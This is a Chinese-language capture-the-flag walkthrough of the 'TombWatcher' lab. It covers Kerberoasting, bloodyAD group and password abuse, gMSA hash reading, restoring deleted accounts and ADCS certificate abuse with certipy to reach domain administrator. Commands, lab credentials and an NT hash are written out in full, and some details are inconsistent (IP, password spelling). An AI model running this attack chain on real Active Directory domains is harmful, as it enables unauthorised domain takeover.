# 信息收集
先用nmap扫一下开放的端口信息
``` bash
nmap -sS -sV -O -p- 11.11.10.72
```
![image](https://github.com/user-attachments/assets/b48fa224-39a1-42c4-9413-c8969aafb796)

针对多个服务（如 LDAP 和 SSL 端口），Nmap 报告了 SSL 证书信息，表明通信是加密的，且证书的颁发者是域控主机 DC01.tombwatcher.htb。
证书有效期：有效期从 2024-11-16 至 2025-06-23。 Subject Alternative Name（SAN）字段中列出了目标主机的备用主机名。

## 可能的攻击向量
Kerberos: 目标机器可能是域控制器，Kerberos 服务可能是一个攻击目标，例如进行 Kerberoasting 攻击。

LDAP: 多个 LDAP 服务端口开放，可能提供进行目录服务枚举和身份验证攻击的机会。

SMB: 445 端口开放，可能是一个文件共享攻击的向量，SMB 漏洞（如 EternalBlue）可能适用。

Web 服务: Web 服务运行 IIS 10.0，可能有特定的漏洞可以利用，尤其是如果应用程序不安全。

# 尝试SMB
henry 为靶场提供的账户

``` bash
smbclient -L //10.10.11.72 -U 'henry' 
```
smbclient 将尝试连接到目标 IP 10.10.11.72，并使用 henry 用户进行身份验证。如果身份验证成功，它会列出该目标服务器上所有公开的共享文件夹和资源。

![image](https://github.com/user-attachments/assets/b7788a2c-c63c-4f62-b575-2fd9f3879f12)

![03b66082f51047430fd4e003612bd24a_](https://github.com/user-attachments/assets/7dbf980d-f871-4e20-bc7d-4672e3f54329)

进去发现都是空的，并没有可利用的敏感信息。

# 尝试kerbos
列出 SPN： 使用 impacket-GetUserSPNs 来列出目标域中所有的服务账户的 SPN 信息。

获取服务票证（TGS）：通过列出的 SPN 信息，提取这些服务的 Kerberos 服务票证。

离线破解：最终通过离线破解服务票证来获得服务账户的密码，进一步渗透系统。


``` bash
impacket-GetUserSPNs tombwatcher.htb/henry:H3nry_987TGV! -dc-ip 10.10.11.72
```
![3a6f3403c760d48f004f67c50a337ac0_](https://github.com/user-attachments/assets/497bf6d8-6435-40ae-9de7-e17085f99a72)
通过运行 impacket-GetUserSPNs，成功列出了与 HTTP/roastme 服务相关的 SPN，并发现该服务由 Alfred 用户提供。接下来通过 Kerberoasting 攻击获取该服务的 Kerberos 服务票证（TGS），并尝试暴力破解该票证，从而恢复 Alfred 用户的密码。


![6c923d180059a148b3358bc085a273d1_](https://github.com/user-attachments/assets/d1070b2f-eaf1-4f8e-8ef3-3e8dab2104a3)
![803bb5e5e3306d82de4204d8b19a410e_](https://github.com/user-attachments/assets/2e94fd51-1258-4b26-aeac-450bdf6e6e43)

这里成功破解出Alfred 密码为 baseketball

# 用bloodhound 分析域内主机
![f3d2c04d7f16d76135dcd3753b6059c4_](https://github.com/user-attachments/assets/329ce35b-339f-4982-aa27-007f6914f16e)

bloodhound 规划出了一条非常清晰的横向移动路径

现把alfred 通过add self 加入 infrastructure 组

``` bash
python3 bloodyAD.py --host 10.10.11.72 -u alfred -p 'basketball' -d tombwatcher.htb add groupMember infrastructure alfred
```

![f476a0c18b5120dd07023cdb369718f7_](https://github.com/user-attachments/assets/6ed65878-5c5c-464a-8a8f-6669ab2fea12)


通过 alfred 用户身份进行 LDAP 查询，查询 GMSA 密码信息

``` bash
nxc ldap 10.10.11.72 -u 'alfred' -p 'basketball' --gmsa
``` 

![95c7042f9e48644a3c74a72206d12a32_](https://github.com/user-attachments/assets/fcb7cc5e-2e01-4f09-8890-10d604d5919a)


结果显示 Infrastructure 组的成员有权限读取 ansible_dev$ 账户的密码，利用 Infrastructure 组的权限获取到敏感的服务账户密码。


这个组能改账户 sam的密码 我把sam账户的密码设置成了123456

``` bash
python3 bloodyAD.py --host 10.10.11.72 -d tombwatcher -u 'ansible_dev$' -p '4b21348ca4a9edff9689cdf75cbda439' set password sam 123456
``` 

![ee31a048aa92d99b5dfba089e299b9f2_](https://github.com/user-attachments/assets/35f959ea-a7a5-404e-897a-233483166ff1)



sam有改变用户john 所有者的权限，所以这里把jonh用户的所有者改为sam
![ad25c19934c060da4d6fdabee5a78ab0_](https://github.com/user-attachments/assets/72e25190-b237-4f51-b08d-7ad19ac8384d)

add genericAll john sam：这条命令为 sam 用户赋予了对 john 账户的 GenericAll 权限。GenericAll 权限使得 sam 可以对 john 用户执行几乎所有操作，例如修改用户信息、密码、权限等。
用新改的密码 登录john 账户 拿到userflag

![7d8013cc76364479bc9c79654dc443dc_2(1](https://github.com/user-attachments/assets/32ead44f-d8b8-4485-904d-3e4da2fa8911)



通过 Evil-WinRM 和 PowerShell 查询了 Active Directory 中所有已删除的用户账户。这些已删除账户可能包含敏感信息或者是权限较高的账户。通过 -IncludeDeletedObjects 参数，你能够看到这些已删除对象，并且可以考虑恢复它们来进行进一步的渗透或分析。

``` bash
Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects
``` 

![image](https://github.com/user-attachments/assets/33b3902c-9170-47f3-b1c4-ea987702c465)

这里发现了三个 账户 我尝试恢复第一个 并讲恢复的cert admin 密码改为123456
``` bash
Restore-ADObject -Identity 'CN=cert_admin\ADELL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb'
``` 
![6dc90951e286f433321b6680eaf82719_](https://github.com/user-attachments/assets/6daede3a-fd0f-47ed-8b23-82886069e648)


certify-ad 工具查找证书模板时没有发现可利用的漏洞，这表明当前域控制器的证书模板可能没有安全问题。

``` bash
certify-ad find -u 'cert_admin' -p '123456' -dc-ip '10.10.11.72' --vulnerable --text --enabled
```

![cb774874de947dd1e847352b7c6df501_](https://github.com/user-attachments/assets/edb6f31f-a2b7-4b6b-9d99-9df6b8e8d739)

后面恢复了第三个账户，发现有 ECS15 可以利用

![089c82e1798ec600d968e4ab5d2f0cf7_](https://github.com/user-attachments/assets/80b7569f-ec37-4aca-892a-2b14d07a1e06)

通过 certipy 工具，成功请求并下载了 administrator@tombwatcher.htb 用户的证书。请求使用了 WebServer 证书模板
证书和私钥被保存在 administrator.pfx 文件中，之后可以将其导入到 Windows 或其他工具中使用，以便 模拟 用户 administrator 或在 Kerberos 身份验证中使用。

``` bash
certipy req -u 'cert_admin' -p '123456' -dc-ip '10.10.11.72' -target 'DC01.tombwatcher.htb' -ca 'tombwatcher-CA-1' -template 'WebServer' -upn 'administrator@tombwatcher.htb'
```


通过使用证书认证并连接到 LDAP，成功对目标域控制器（10.10.11.72）进行了认证，获得了对 administrator 用户的访问权限。

``` bash
certipy auth -pfx administrator.pfx -dc-ip '10.10.11.72' -ldap-shell
```

进入administrator 账户成功拿到root flag

![4f13417f2db277be24962aec1d853439_](https://github.com/user-attachments/assets/768c6886-5cfd-4d87-bfba-16fc108112cf)





